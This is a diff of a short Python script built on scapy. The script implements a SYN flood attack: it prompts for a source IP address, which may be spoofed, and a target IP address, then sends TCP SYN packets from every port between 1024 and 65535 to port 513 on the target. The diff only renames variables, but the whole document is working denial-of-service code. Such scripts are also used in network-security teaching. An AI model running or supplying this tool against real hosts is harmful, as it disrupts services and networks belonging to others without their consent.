@@ -4,14 +4,14 @@
 
 from scapy.all import *
 
-def synFlood(src, tgt): 					# The function that creates and distributes the SYN attack
+def synFlood(Source, Target): 					# The function that creates and distributes the SYN attack
 	for sport in range(1024, 65535):			# Continues to send packets as long as the range is between 1024, 65535 (64511)
-		IPlayer = IP(src=src, dst=tgt)			 
+		IPlayer = IP(src=Source, dst=Target)			 
 		TCPlayer = TCP(sport=sport, dport=513)		#The destination port of attack is 513
 		pkt = IPlayer / TCPlayer
 		send(pkt)					#Sends the packet, continuously
 
-src = raw_input("\n\n\t What is the Source IP Address : ")	#Asks for the users input to determine packets sent
-tgt = raw_input("\n\n\t What is the Destination IP Address : ")
+Source = raw_input("\n\n\t What is the Source IP Address : ")	#Asks for the users input to determine packets sent
+Target = raw_input("\n\n\t What is the Destination IP Address : ")
 
-synFlood(src, tgt)		# references and calls for the synFlood function
+synFlood(Source, Target) # references and calls for the synFlood function
